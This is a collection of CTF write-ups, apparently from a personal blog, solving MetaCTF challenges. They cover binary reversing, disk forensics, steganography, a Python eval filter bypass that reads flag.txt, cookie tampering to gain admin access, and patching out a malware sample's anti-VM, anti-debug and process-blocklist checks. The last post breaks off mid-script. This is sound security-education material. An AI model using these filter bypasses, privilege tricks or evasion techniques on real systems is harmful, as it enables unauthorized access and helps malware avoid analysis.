[{"content":"NOThing to C Here Move along, NOThing to see here, no flags in sight\u0026hellip;\nRunning file against the executable:\n└─$ file NothingToC NothingToC: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=d1f89a3ac713a435ad3b35e178b2d49548640c86, for GNU/Linux 4.4.0, stripped The binary provided with the challenge is a 64-bit, dynamically linked, PIE-enabled, stripped of debug info.\nExecuting the binary:\n└─$ ./NothingToC === NOTing To C Flag Checker === Ready to check your flag? Let\u0026#39;s see what you\u0026#39;ve got! Enter the flag to check: AAAA Oops! Your flag is 4 characters long, but I\u0026#39;m looking for exactly 28 characters. Maybe count your characters next time? Hmm... that does NOT look right... It appears that the executable expects the flag as input and requires it to be 28 characters long.\nLoad it into IDA for static analysis. Press F5 to generate pseudocode.\nNow open the main function from the Funtions list and let\u0026rsquo;s take a closer look at the generated pseudocode.\n__int64 __fastcall main(int a1, char **a2, char **a3) { unsigned int v3; // eax char *v4; // rsi char *v5; // rdi size_t v6; // rax char *v7; // rdx _BYTE *v8; // rcx __int64 result; // rax void (*v10)(void); // rdx __m128i v11[2]; // [rsp+0h] [rbp-138h] BYREF char s[28]; // [rsp+20h] [rbp-118h] BYREF char v13[236]; // [rsp+3Ch] [rbp-FCh] BYREF unsigned __int64 v14; // [rsp+128h] [rbp-10h] v14 = __readfsqword(0x28u); v11[0] = _mm_load_si128((const __m128i *)\u0026amp;xmmword_2240); *(__m128i *)((char *)v11 + 12) = _mm_load_si128((const __m128i *)\u0026amp;xmmword_2250); v3 = time(0LL); srand(v3); puts(\u0026#34; === NOTing To C Flag Checker === \u0026#34;); puts(\u0026#34;Ready to check your flag? Let\u0026#39;s see what you\u0026#39;ve got!\\n\u0026#34;); printf(\u0026#34;Enter the flag to check: \u0026#34;); v4 = (char *)\u0026amp;qword_100; if ( fgets(s, 256, stdin) ) { v5 = s; s[strcspn(s, \u0026#34;\\n\u0026#34;)] = 0; v6 = strlen(s); if ( v6 == 28 ) { v7 = s; v8 = (_BYTE *)v11; v4 = v13; while ( *v8 == ~*v7 ) { ++v7; ++v8; if ( v7 == v13 ) { puts(\u0026#34;\\nCONGRATULATIONS!\u0026#34;); v4 = s; v5 = \u0026#34;The flag is: %s\\n\u0026#34;; printf(\u0026#34;The flag is: %s\\n\u0026#34;, s); goto LABEL_10; } } } else { v4 = (char *)v6; printf(\u0026#34;Oops! Your flag is %zu characters long, but I\u0026#39;m looking for exactly %d characters.\\n\u0026#34;, v6, 28LL); v5 = \u0026#34;Maybe count your characters next time?\u0026#34;; puts(\u0026#34;Maybe count your characters next time?\u0026#34;); } switch ( rand() % 6 ) { case 0: v5 = \u0026#34;Nice try, but that\u0026#39;s NOT it!\u0026#34;; puts(\u0026#34;Nice try, but that\u0026#39;s NOT it!\u0026#34;); break; case 1: v5 = \u0026#34;Hmm... that does NOT look right...\u0026#34;; puts(\u0026#34;Hmm... that does NOT look right...\u0026#34;); break; case 2: v5 = \u0026#34;NOT quite it! Keep trying!\u0026#34;; puts(\u0026#34;NOT quite it! Keep trying!\u0026#34;); break; case 3: v5 = \u0026#34;Incorrect! But do NOT give up!\u0026#34;; puts(\u0026#34;Incorrect! But do NOT give up!\u0026#34;); break; case 4: v5 = \u0026#34;That\u0026#39;s NOT the flag I\u0026#39;m looking for!\u0026#34;; puts(\u0026#34;That\u0026#39;s NOT the flag I\u0026#39;m looking for!\u0026#34;); break; case 5: v5 = \u0026#34;NOPE! This flag is NOT what I expected.\u0026#34;; puts(\u0026#34;NOPE! This flag is NOT what I expected.\u0026#34;); break; default: break; } LABEL_10: result = 0LL; } else { v5 = \u0026#34;Hmm, seems like you\u0026#39;re having trouble typing...\u0026#34;; puts(\u0026#34;Hmm, seems like you\u0026#39;re having trouble typing...\u0026#34;); result = 1LL; } v10 = (void (*)(void))(v14 - __readfsqword(0x28u)); if ( v10 ) start((__int64)v5, (__int64)v4, v10); return result; } The variable s is the input buffer where the flag is stored, it\u0026rsquo;s declared as char s[28] and populated by the fgets(s, 256, stdin) call.\nHere\u0026rsquo;s what the program does:\nInput: Reads the input into buffer s Length check: Verifies the input is exactly 28 characters (0x1C) Character comparison: Compares each character of the input against a stored pattern using Bitwise NOT The important logic is in the loop:\nwhile ( *v8 == ~*v7 ) This compares each byte of the stored pattern v11 (v8) with the Bitwise NOT of each character from the input s. If the stored byte is X, the input character needs to be ~X (Bitwise complement).\nNow let\u0026rsquo;s go back to the beginning of the code.\nThe correct flag characters are the Bitwise NOT of the bytes stored in v11. The pattern is loaded from xmmword_2240 and xmmword_2250.\nv11[0] = _mm_load_si128((const __m128i *)\u0026amp;xmmword_2240); *(__m128i *)((char *)v11 + 12) = _mm_load_si128((const __m128i *)\u0026amp;xmmword_2250); First line: Loads 16 bytes from xmmword_2240 into the start of buffer v11\nSecond line: Loads 16 bytes from xmmword_2250 into v11 starting at offset 12. (overwrites the last 4 bytes of xmmword_2240)\nThe memory layout should result something like this:\nv11: [----16 bytes from 2240----][----16 bytes from 2250----] [0.................11][12................27] Bytes 0-11: From xmmword_2240\nBytes 12-27: From xmmword_2250\nTotal: 28 bytes (the flag length)\nIf you click on any of them, IDA will take you to their location.\n.rodata:0000000000002240 xmmword_2240 xmmword 0A0CA96A0CA9697C884B9ABBC9E8B9AB2h .rodata:0000000000002240 ; DATA XREF: main+A↑r .rodata:0000000000002250 xmmword_2250 xmmword 8286CB88A0CC978BA08BCF91A0CA96A0h v11 memory layout (28 bytes total):\nOffset: 0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 [B2 9A 8B 9E BC AB B9 84 C8 97 96 CA][A0 96 CA A0 91 CF 8B A0 8B 97 CC A0 88 CB 86 82] |----------from xmmword_2240----------|----------from xmmword_2250----------------| Applying the bitwise NOT operation reveals the flag.\nCyberChef recipe for Bitwise NOT\n","permalink":"https://hexed.space/posts/metactf-july-2025-flash-ctf/","summary":"NOThing to C Here Move along, NOThing to see here, no flags in sight\u0026hellip;\nRunning file against the executable:\n└─$ file NothingToC NothingToC: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=d1f89a3ac713a435ad3b35e178b2d49548640c86, for GNU/Linux 4.4.0, stripped The binary provided with the challenge is a 64-bit, dynamically linked, PIE-enabled, stripped of debug info.\nExecuting the binary:\n└─$ ./NothingToC === NOTing To C Flag Checker === Ready to check your flag?","title":"MetaCTF July 2025 Flash CTF - NOThing to C Here"},{"content":"MetaCTF February 2025 Flash CTF consists of 5 challenges.\nCookie Crackdown We\u0026rsquo;re auditing some websites to check if they\u0026rsquo;re GDPR compliant, and I\u0026rsquo;m pretty sure this site isn\u0026rsquo;t\u0026hellip;\nUpon loading the site, we are presented with a modal requiring us to consent to cookies.\nFrom the challenge description and the web page, we can assume that the flag is probably stored as a cookie.\nPressing F12 will bring up the Developer menu. Navigating to the Application tab and then selecting Cookies will reveal a cookie conveniently named flag.\nbetter_eval() I just want to let people run python code, but they keep trying to read flag.txt. So, I made a better eval that has filters to stop this!\nDownload the code here and connect to the remote instance with nc [REDACTED] 30019\nIn the event that remote instance goes down, you can also use nc [REDACTED] 5110. These two are identical, this is just the backup.\nHere\u0026rsquo;s the Python code\n#!/usr/local/bin/python def better_eval(untrusted_code): blocked_terms = [\u0026#34;flag\u0026#34;, \u0026#34;+\u0026#34;, \u0026#34;import\u0026#34;, \u0026#34;os\u0026#34;, \u0026#34;eval\u0026#34;, \u0026#34;exec\u0026#34;] for term in blocked_terms: if term in untrusted_code: print(f\u0026#34;The term {term} is filtered!\u0026#34;) return try: # Execute the user input in the restricted environment without globals or locals print(eval(untrusted_code)) except Exception as e: print(f\u0026#34;Error: {e}\u0026#34;) while True: untrusted_code = input(\u0026#34;Enter your python code\u0026gt; \u0026#34;) better_eval(untrusted_code) We can see that there is a list of blocked keywords, including import, os, and flag.\nAlthough this appears to impose strict limitations, we can bypass the filter with a simple one-liner using obfuscation:\nprint(open(\u0026#34;txt.galf\u0026#34;[::-1]).read().strip()) This command opens and prints the content of the flag.txt file. To evade the filter, we spell \u0026ldquo;flag.txt\u0026rdquo; backwards and then reverse it in Python to access the correct filename.\nExploiting the filter\n└─$ nc [REDACTED] 30019 Enter your python code\u0026gt; print(open(\u0026#34;txt.galf\u0026#34;[::-1]).read().strip()) MetaCTF{f1l73rs_d0_n0t_s3cur3_u} None Enter your python code\u0026gt; By reversing the string flag.txt, we successfully bypassed the keyword filter and retrieved the flag. This demonstrates that simple blacklisting of keywords is not a reliable security measure, as it can often be circumvented with obfuscation techniques.\nTill Delete Do Us Part I was messing with trying to dual boot, and while trying to fix partitions, I accidentally deleted the one on my wedding flash drive I carelessly had plugged in! Please help me recover it!\nOnce we download the file, we need to identify its type with file command:\n└─$ file usb.img usb.img: DOS/MBR boot sector This indicates that the file is a disk image containing a DOS/MBR boot sector. It could represent a USB drive, hard drive, or partition.\nWe use fdisk or parted to inspect the partitions:\n└─$ fdisk -l usb.img Disk usb.img: 256 MiB, 268435456 bytes, 524288 sectors Units: sectors of 1 * 512 = 512 bytes Sector size (logical/physical): 512 bytes / 512 bytes I/O size (minimum/optimal): 512 bytes / 512 bytes Disklabel type: dos Disk identifier: 0xf4fa0c7e └─$ parted usb.img WARNING: You are not superuser. Watch out for permissions. GNU Parted 3.6 Using /home/kali/metactf_ctf 2025 feb/usbnew/usb.img Welcome to GNU Parted! Type \u0026#39;help\u0026#39; to view a list of commands. (parted) print Model: (file) Disk /home/kali/metactf_ctf 2025 feb/usbnew/usb.img: 268MB Sector size (logical/physical): 512B/512B Partition Table: msdos Disk Flags: Number Start End Size Type File system Flags No partitions are found. Since they might have been deleted, we attempt to recover them.\nWe use testdisk to restore the lost partition:\ntestdisk usb.img Select Proceed Choose Intel for the partition table Select Analyse -\u0026gt; Quick Search Locate the FAT32 partition and select Write Confirm with Y and press Enter If we check again with fdisk or parted, the partitions should be restored:\n└─$ fdisk -l usb.img Disk usb.img: 256 MiB, 268435456 bytes, 524288 sectors Units: sectors of 1 * 512 = 512 bytes Sector size (logical/physical): 512 bytes / 512 bytes I/O size (minimum/optimal): 512 bytes / 512 bytes Disklabel type: dos Disk identifier: 0xf4fa0c7e Device Boot Start End Sectors Size Id Type usb.img1 * 2048 524287 522240 255M b W95 FAT32 ─$ parted usb.img (parted) print Model: (file) Disk /home/kali/metactf_ctf 2025 feb/usbnew/usb.img: 268MB Sector size (logical/physical): 512B/512B Partition Table: msdos Disk Flags: Number Start End Size Type File system Flags 1 1049kB 268MB 267MB primary fat32 boot Next, we will need to mount the drive. To mount a disk image containing partitions, we must specify the offset so the system knows where the partition starts. The offset is calculated as:\nOffset = Starting Sector × Sector Size Offset = 2048 × 512 = 1048576 For most disks the sector size is 512.\nWe can mount the partition:\nsudo mount -o loop,offset=1048576 usb.img /mnt/usb Once mounted, we can explore the drive. Let\u0026rsquo;s check the Wedding photos directory for any hidden messages:\nstrings *.jpg | grep -i Meta Nothing comes up.\nWe can use also SleuthKit and fls to list all files, including deleted ones:\nfls -r -o 2048 usb.img Nowe we have a list of all the files and directories, including the ones marked as deleted.\nd/d 62691: .Meta + d/d 62677: CTF ++ d/d 62710: {n +++ d/d 62725: 0 ++++ d/d 62742: t +++++ d/d 62757: _ ++++++ d/d 62774: ev +++++++ d/d 62790: 3n ++++++++ d/d 62805: _ +++++++++ d/d 62822: d3 ++++++++++ d/d 62838: l3t +++++++++++ d/d 62854: 10n ++++++++++++ d/d 62869: _ +++++++++++++ d/d 62886: c4 ++++++++++++++ d/d 62902: n +++++++++++++++ d/d 62917: _ ++++++++++++++++ d/d 62934: s3 +++++++++++++++++ d/d 62950: part ++++++++++++++++++ d/d 62965: 3_ +++++++++++++++++++ d/d 62982: u ++++++++++++++++++++ d/d 62997: 5} The flag is made of nested directories. Extract the directories\u0026rsquo; names to reconstruct it.\nFiles marked for deletion can be recovered with icat and the sector offset:\nicat -o 2048 usb.img 63014 \u0026gt; clue.txt This extracts clue.txt from sector 63014.\nCarrot Our threat intelligence has found a malware sample that seems heavily targeted at our competitor, MeatCTF. We tried to analyze it, but it just does nothing when we run it in a VM, can you help us analyze this?\nDownload the sample here and unzip with the password infected\nExtract the file and run file:\n└─$ file carrot carrot: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=fd82f7845645aea67dee789f5cac0de456e83108, for GNU/Linux 4.4.0, stripped This is a 64-bit Linux ELF binary, dynamically linked and PIE-enabled, keep that in mind for later.\nLoad it into IDA for static analysis. Press F5 to generate pseudocode.\nScrolling through the functions, we find .PEM_read_bio_RSA_PUBKEY, indicating that encryption is likely occurring somewhere in the code.\nOpen the main function and its pseudocode.\nWe can see there\u0026rsquo;s a block of if statements that lead to more code execution. To reach that point in the code, we will need to pass the validation checks presented by the aforementioned if block.\nif ( !(unsigned int)sub_3531(a1, a2, a3) \u0026amp;\u0026amp; !(unsigned int)sub_371A() \u0026amp;\u0026amp; !(unsigned int)sub_3773() \u0026amp;\u0026amp; !(unsigned int)sub_356F() \u0026amp;\u0026amp; !(unsigned int)sub_3622() \u0026amp;\u0026amp; (unsigned int)sub_37DA() \u0026amp;\u0026amp; (unsigned int)sub_32B6() \u0026amp;\u0026amp; !(unsigned int)sub_3378() \u0026amp;\u0026amp; (unsigned int)sub_3503() \u0026amp;\u0026amp; !(unsigned int)sub_2C87() \u0026amp;\u0026amp; (int)sub_2C5A() \u0026gt; 1 ) { There are quite a few, so let\u0026rsquo;s go through them.\nsub_3531() This function appears to check if ptrace is running. Since we do not use ptrace, we can ignore this one.\nsub_371A() _BOOL8 sub_371A() { time_t v0; // rax _BOOL8 result; // rax time_t v2; // rbx time_t v3; // rdi double v4; // xmm0_8 v0 = time(0LL); if ( v0 == -1 ) return 0LL; v2 = v0; sleep(0x96u); v3 = time(0LL); if ( v3 == -1 ) return 0LL; v4 = difftime(v3, v2); result = 1LL; if ( v4 \u0026gt;= 149.95 ) return v4 \u0026gt; 150.25; return result; } This is an anti-debugging function. It gets the system time, sleeps for 150 seconds, then gets the system time again after sleep. If the difference between the two times is about 150 seconds, it returns true, allowing the check to pass. If the difference is not close to 150 seconds, it returns false, and the check fails.\nThere are numerous ways to bypass this, but the easiest approach is to change the value of the sleep timer to 1 second (0x1 in hex).\nRight click on the instruction, select Manual, and change 96h to 1h\nAddress Original Patch 372C mov edi, 96h mov edi, 1h Next, go to the main function, select the following instruction, then go to Edit -\u0026gt; Patch Program -\u0026gt; Change Byte:\nAddress Instruction 248C jnz short loc_2477 Replace the opcode for jnz (75) with jz (74) to reverse the if-statement:\n74 E9 E8 E0 12 00 00 85 C0 75 E0 E8 D3 10 00 00 Address Original Patched 248C jnz short loc_2477 jz short loc_2477 sub_3773() Another function that involves timers.\nThe loop continues until the difference (difftime(v2, v0)) is at least 150.0 seconds.\nOnce the loop exits, it calculates the final difference (v3 = difftime(v2, v0)) and sets result to 1 (TRUE).\nAt the end, it checks if v3 is greater than or equal to 149.95. If so, it returns whether v3 is greater than 150.25.\n0 (false) 1 (true) If time(0LL) fails (returns -1). If v3 \u0026gt;= 149.95 and v3 \u0026gt; 150.25. If v3 \u0026gt;= 149.95 but v3 \u0026lt;= 150.25. If v3 \u0026lt; 149.95. do v2 = time(0LL); while ( difftime(v2, v0) \u0026lt; 150.0 ); v3 = difftime(v2, v0); result = 1LL; if ( v3 \u0026gt;= 149.95 ) return v3 \u0026gt; 150.25; The validation check only passes if the function returns FALSE. Let\u0026rsquo;s patch it and reverse the process.\nThe opcode for ja is 77.\nThe opcode for jb is 72.\nAddress Original Patch 37A9 ja short loc_3788 jb short loc_3788 Address Original Patch 37C7 ja short loc_37D6 jb short loc_37D6 Go back to main().\nAddress Original Patch 2495 jnz short loc_2477 jz short loc_2477 sub_356F() This checks ensures the code is not running in a VM. Specifically, it opens /proc/cpuinfo and checks whether or not \u0026ldquo;hypervisor\u0026rdquo; is present.\nReverse it by patching jnz to jz in main(). Opcodes were provided earlier in the write-up.\nAddress Original Patch 249E jnz short loc_35BB jz short loc_35BB sub_3622() Another anti-VM check. This one looks for the strings QEMU, VirtualBox, and VMware. Just patch it in main().\nAddress Original Patch 24A7 jnz short loc_2477 jz short loc_2477 sub_37DA() This function uses curl to open two addresses: https://metactf.com and https://e205e724dda896b5a70bb03b7aed1dba.metactf.com. If the first address returns HTTP status code 200, v0 is set to TRUE. After this, curl tries to open the second address, and if the HTTP code is NOT 200, v0 is set to TRUE, and the function returns v0. For this validation to pass, the first URL needs to be accessible, and the second URL must not be. If we do a DNS check, we will find out that the second (sub)domain has no DNS records, so we don\u0026rsquo;t need to do anything here.\nsub_32B6() This function validates the IP address of the machine. It checks if the machine’s IP address starts with 10.13.37.. To bypass this, we will patch it in main().\n__int64 sub_32B6() { struct ifaddrs *i; // rbx const struct sockaddr *ifa_addr; // rdi struct ifaddrs *ifap; // [rsp+8h] [rbp-430h] BYREF char host[1025]; // [rsp+17h] [rbp-421h] BYREF unsigned __int64 v5; // [rsp+418h] [rbp-20h] v5 = __readfsqword(0x28u); if ( getifaddrs(\u0026amp;ifap) == -1 ) { LODWORD(i) = 0; } else { for ( i = ifap; i; i = i-\u0026gt;ifa_next ) { ifa_addr = i-\u0026gt;ifa_addr; if ( ifa_addr \u0026amp;\u0026amp; ifa_addr-\u0026gt;sa_family == 2 \u0026amp;\u0026amp; !getnameinfo(ifa_addr, 0x10u, host, 0x401u, 0LL, 0, 1) \u0026amp;\u0026amp; !strncmp(host, \u0026#34;10.13.37.\u0026#34;, 9uLL) ) { LODWORD(i) = 1; break; } } This function fills ifap with a linked list of all network interfaces on the system.\nThe code iterates through every node in the linked list, extracts and processes interface addresses, uses getnameinfo() to resolve IP addresses into hostnames and then strncmp() to compare the first 9 characters of the host string to the target IP prefix(10.13.37.).\nWe can patch this in main().\nAddress Original Patch 24BB jz short loc_2477 jnz short loc_2477 sub_3378() This function checks running processes. It ensures that processes like Wireshark, Pspy, gdb, strace, or ltrace aren\u0026rsquo;t running. Additionally, it checks that apache2 is running, as it\u0026rsquo;s a must requirement to pass the check.\nv0 = 0; v10 = __readfsqword(0x28u); v1 = opendir(\u0026#34;/proc\u0026#34;); if ( v1 ) { v2 = v1; v0 = 1; while ( 1 ) { v3 = readdir(v2); if ( !v3 ) break; if ( v3-\u0026gt;d_type == 4 ) { d_name = v3-\u0026gt;d_name; if ( atoi(v3-\u0026gt;d_name) \u0026gt; 0 ) { snprintf(s, 0x100uLL, \u0026#34;/proc/%s/cmdline\u0026#34;, d_name); v5 = fopen(s, \u0026#34;r\u0026#34;); v6 = v5; if ( v5 ) { if ( fgets(haystack, 1024, v5) ) { if ( strstr(haystack, \u0026#34;wireshark\u0026#34;) || strstr(haystack, \u0026#34;pspy\u0026#34;) || strstr(haystack, \u0026#34;gdb\u0026#34;) || strstr(haystack, \u0026#34;strace\u0026#34;) || strstr(haystack, \u0026#34;ltrace\u0026#34;) ) { v0 = 1; fclose(v6); break; } v0 = (strstr(haystack, \u0026#34;apache2\u0026#34;) == 0LL) \u0026amp; (unsigned __int8)v0; } We can patch this check in main().\nAddress Original Patch 24C6 jnz short loc_2477 jz short loc_2477 sub_3503() This function validates the username of the user and it can be patched in main()\nAddress Original Patch 24CF jz short loc_2477 jnz short loc_2477 sub_2C87() This function validates the environment variable LD_PRELOAD in the UNIX-like operating systems. LD_PRELOAD allows to specify shared libraries to be loaded before all others when a program is executed. By doing so, existing functions can be overridden or extended. We are not doing anything like that and thus this doesn\u0026rsquo;t need to be patched.\nsub_2C5A() This function performs another anti-VM check, looking at the fan count. Virtual machines typically report a fan count of zero, which would cause the check to fail.\nThis is done by reading /sys/devices, /sys/class/hwmon, /proc/acpi/fan - virtual filesystems that expose kernel and system information to user space.\nThe patch for this is applied in main(), where the instruction jle can be changed to jge.\nOpcode for JLE is 7E and JGE is 7D\nAddress Original Patch 24E3 jle short loc_2477 jge short loc_2477 sub_2793() This function checks the hostname of the machine, expecting it to be www.\nTo bypass this, we need to patch main().\nif ( v3 \u0026amp;\u0026amp; (v5 = strcmp(v3, \u0026#34;www\u0026#34;)) == 0 ) Address Original Patch 2508 jz short loc_2524 jnz short loc_2524 sub_2C9F() More checks but we are at the end.\nv4 = (char *)sub_2C9F(); char *sub_2C9F() { char *v0; // rbx char *v1; // rbp char *v2; // r12 char *v3; // r13 __int64 v4; // r15 char *v5; // rax char *v6; // r14 unsigned int v8; // [rsp+Ch] [rbp-3Ch] v0 = (char *)sub_2826(); v1 = (char *)sub_2793(); v2 = (char *)sub_27FB(); v3 = (char *)sub_298E(); v4 = (unsigned int)sub_2C5A(); v8 = sub_2C87(); v5 = (char *)malloc(0x2000uLL); v6 = v5; if ( v5 ) { if ( !v3 ) v3 = \u0026#34;unknown\u0026#34;; if ( !v2 ) v2 = \u0026#34;unknown\u0026#34;; if ( !v1 ) v1 = \u0026#34;unknown\u0026#34;; if ( !v0 ) v0 = \u0026#34;unknown\u0026#34;; snprintf( v5, 0x2000uLL, \u0026#34;{\\\u0026#34;ip_addresses\\\u0026#34;: \\\u0026#34;%s\\\u0026#34;, \\\u0026#34;hostname\\\u0026#34;: \\\u0026#34;%s\\\u0026#34;, \\\u0026#34;username\\\u0026#34;: \\\u0026#34;%s\\\u0026#34;, \\\u0026#34;processes\\\u0026#34;: \\\u0026#34;%s\\\u0026#34;, \\\u0026#34;fan_count\\\u0026#34;: %d, \\\u0026#34;\u0026#34; \u0026#34;ld_preload_set\\\u0026#34;: %d}\u0026#34;, v0, v1, v2, v3, v4, v8); } else { perror(\u0026#34;malloc\u0026#34;); free(v0); free(v1); free(v2); free(v3); } return v6; } This time, there are four new functions, along with the previous `LD_PRELOAD and fan count checks. The four new functions peform a duplicate functionality of some of the previous validations.\nFunction Validation sub_2826 IP Address sub_2793 Hostname sub_27FB Username sub_298E Apache2 process Earlier, we identified the executable as PIE-enabled. This means the executable uses relative addressing for its functions and data instead of hardcoded absolute memory addresses.\nThe code references locations relative to the current instruction pointer (RIP). This allows the program to run correctly no matter where it\u0026rsquo;s loaded in memory.\nWhat does this have to do with the patching? Well, we will apply patches using relative addresses.\nInstead of patching the functions, we will patch the if-statements and the unknown strings that are assigned.\nLets start off with v3, which is supposed to return apache2.\nHow is the relative address calculated?\n(address of string)-(address of lea instruction + 7) 7 is the instruction size estimate for lea\nPressing SHIFT+F12 brings up the strings list. There we can find the apache2 string at location 0x41AF. lea instruction is located at 0x2D33\nOffset = 41AF - (2D33 + 7) = 1475 = 75 14 converted to Little-Endian Now that we have the correct offset, we can change the code.\nSelect the following instruction and patch the code(Edit-\u0026gt;Patch Program-\u0026gt;Change Bytes). Keep the first 3 bytes and add the offset.\nAddress Original Patch 2D33 4C 8D 2D 58 13 00 00 4C 8D 2D 75 14 00 00 We repeat the same process for v2(meatctf), v1(www) and v0(10.13.37.).\nThe calculated offsets are as follows:\nName Offset (Little-Endian) v2(meatctf) 71 14 v1(www) 6B 15 v0(10.13.37.) 26 14 Now that assigned values are patched we need to patch and reverse the if-statements too.\nAddress Original Patch 2D31 jnz short loc_2D3A jz short loc_2D3A 2D3D jnz short loc_2D46 jz short loc_2D46 2D49 jnz short loc_2D52 jz short loc_2D52 2D55 jnz short loc_2D5E jz short loc_2D5E sub_2C87() is the LD_PRELOAD. This one we can ignore again.\nsub_2C5A() is the fan check, but instead of patching the function itself, a patch can be applied to sprintf() in sub_2C9F(), which appears to store some kind of JSON data.\nAddress Instruction 2D6E lea rdx, aIpAddressesSHo Double-click on aIpAddressesSHo to go to the string, switch to Hex-View and replace the %d delimeter after fan_count with a number above 0, like 2. Apply the change.\nThat was all. Save the changes and run the program.\nBinary patch\nDownload carrot.diff\nApply the patch.\nbspatch carrot carrot_patched carrot.diff ","permalink":"https://hexed.space/posts/metactf-february-2025-flash-ctf/","summary":"MetaCTF February 2025 Flash CTF consists of 5 challenges.\nCookie Crackdown We\u0026rsquo;re auditing some websites to check if they\u0026rsquo;re GDPR compliant, and I\u0026rsquo;m pretty sure this site isn\u0026rsquo;t\u0026hellip;\nUpon loading the site, we are presented with a modal requiring us to consent to cookies.\nFrom the challenge description and the web page, we can assume that the flag is probably stored as a cookie.\nPressing F12 will bring up the Developer menu.","title":"MetaCTF February 2025 Flash CTF"},{"content":"MetaCTF November 2024 Flash CTF consists of 5 challenges.\nSlithering Security Help me test my sssecurity, can you get the flag from this ssssecure sssscript? Download the challenge file here.\nWe are provided with a small Python script that prompts the user for a password. If the correct password is entered, the script reveals the flag.\nHere\u0026rsquo;s the code:\n#!/usr/bin/env python3 SECRET_FLAG=b\u0026#34;\\x54\\x57\\x56\\x30\\x59\\x55\\x4e\\x55\\x52\\x6e\\x74\\x6b\\x4d\\x47\\x34\\x33\\x58\\x7a\\x64\\x79\\x64\\x58\\x4d\\x33\\x58\\x32\\x4e\\x73\\x4d\\x57\\x34\\x33\\x63\\x31\\x39\\x33\\x61\\x54\\x64\\x6f\\x58\\x33\\x4d\\x7a\\x59\\x33\\x49\\x7a\\x4e\\x33\\x4e\\x7a\\x63\\x33\\x4e\\x7a\\x63\\x33\\x4e\\x39\u0026#34; HASHED_PASSWORD = b\u0026#39;\\x12\\x1eW\\x98\\x00\\xc1C\\xff\\xe3\\xa9\\x15\\xde\\xd9\\x00\\x9b\\xc9\u0026#39; from base64 import b64decode from hashlib import md5 def check_password(password): m = md5() m.update(password) return m.digest() == HASHED_PASSWORD def main(): while True: inp = input(\u0026#34;Please enter your passssssword: \u0026#34;).encode() if check_password(inp): print(f\u0026#34;Well done, your flag isssssss {b64decode(SECRET_FLAG).decode()}\u0026#34;) exit() else: print(\u0026#34;Passsssssword incorrect, please try again.\u0026#34;) if __name__ == \u0026#34;__main__\u0026#34;: main() Both the password and the flag are represented in hexadecimal format, but the flag is further encoded in Base64.\nTo extract the flag, we can use CyberChef or the terminal. Using awk, we can strip out the \\x delimiters, convert the hexadecimal to ASCII, and then pipe the result into base64 for decoding.\necho -n \u0026#39;\\x54\\x57\\x56\\x30\\x59\\x55\\x4e\\x55\\x52\\x6e\\x74\\x6b\\x4d\\x47\\x34\\x33\\x58\\x7a\\x64\\x79\\x64\\x58\\x4d\\x33\\x58\\x32\\x4e\\x73\\x4d\\x57\\x34\\x33\\x63\\x31\\x39\\x33\\x61\\x54\\x64\\x6f\\x58\\x33\\x4d\\x7a\\x59\\x33\\x49\\x7a\\x4e\\x33\\x4e\\x7a\\x63\\x33\\x4e\\x7a\\x63\\x33\\x4e\\x39\u0026#39; | awk \u0026#39;{gsub(/\\\\x/, \u0026#34;\u0026#34;); print}\u0026#39; | base64 --decode Admin portal I\u0026rsquo;m writing a webpage for admins to check on their flags, can you do me a favor and check it out to make sure there aren\u0026rsquo;t any issues? Check out the website here.\nWe are given the URL to a webpage. Upon visiting, the following message is displayed:\nAccess denied. This page is only available by administrators. To gain access, we need to obtain administrator privileges.\nOpen the Developer tools by pressing F12. After inspecting the page, we find no traces of JavaScript. Switch to the Network tab to analyze the request and response headers. In the headers, we find the following cookie:\nCookie: role=user Exploiting the Cookie\nThe role cookie is set to user. We can modify it, and try to gain access:\nNavigate to the Application tab in the developer tools. Select Cookies from the left-side menu and locate the role cookie. Change its value from user to admin. Reload the page.\nAfter the cookie is changed and the page is reloaded, we are \u0026ldquo;authorized\u0026rdquo; and the flag is displayed.\nSteg64 You\u0026rsquo;ve heard of Base64, but I present to you Steg64! Download the challenge file here.\nVEh= QT== Tl== S5== IF== Wd== Tx== VY== IF== SA== Qd== Q1== Sx== RR== Up== Ie== Cs== Ct== Qh== VX== VN== IJ== T4== Vc== Ut== IN== Rt== TH== Qc== R8== IN== Se== Ux== IN== SR== Ts== II== Qd== Th== T3== VN== SI== RY== Us== IF== Q9== QQ== U9== VF== TP== RU== IQ== The description suggests that the challenge involves steganography- the practice of concealing information within other data in a way that isn\u0026rsquo;t obvious.\nEvery line is a string encoded in Base64. Let’s break down Base64 principles.\nUnderstanding Base64\nIt takes 3 bytes (24 bits) of data at a time. It splits these bits into 4 groups of 6 bits each. Maps each 6-bit group to one of 64 printable characters: a-z, A-Z, 0-9, +, /. These 3 bytes are now turned into 4 printable ASCII characters. If the number of bytes is completely divisible by 3, leaving no remainder, then the mapping is perfect and no additional processing is needed.\nIn cases where it\u0026rsquo;s not, padding is needed to mark the unused bits.\n= is appended at the end for every unused 2 bits. E.g, QUI= (AB = 2 bytes of input) or QQ==(A = 1 byte of input).\nThe reference table for the conversion can be found here.\nThe decoders ignore those zero\u0026rsquo;d bits and the padding; thus, this gives the oppurtunity to hide information.\nHere\u0026rsquo;s a script that reads the steg64.txt file, processes and decodes every line, and extracts the hidden message.\nimport base64 def base64_to_6bit_values(line): # Converts a base64 encoded string to a string of 6-bit binary values. base64_chars = \u0026#34;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\u0026#34; char_to_6bit = {char: f\u0026#34;{index:06b}\u0026#34; for index, char in enumerate(base64_chars)} binary_string = \u0026#34;\u0026#34; for char in line.strip(): if char in char_to_6bit: binary_string += char_to_6bit[char] return binary_string def extract_unused_bits(line): # Extracts unused bits from the base64 encoded line. # Base64 encodes data in 6-bit chunks, and padding characters \u0026#39;=\u0026#39; are used to # mark unused bits. padding_count = line.count(\u0026#39;=\u0026#39;) if padding_count == 0: return \u0026#34;\u0026#34; # Calculate unused bits: 2 for one padding \u0026#39;=\u0026#39;, 4 for two \u0026#39;==\u0026#39; unused_bits = padding_count * 2 binary_string = base64_to_6bit_values(line) return binary_string[-unused_bits:] if unused_bits \u0026gt; 0 else 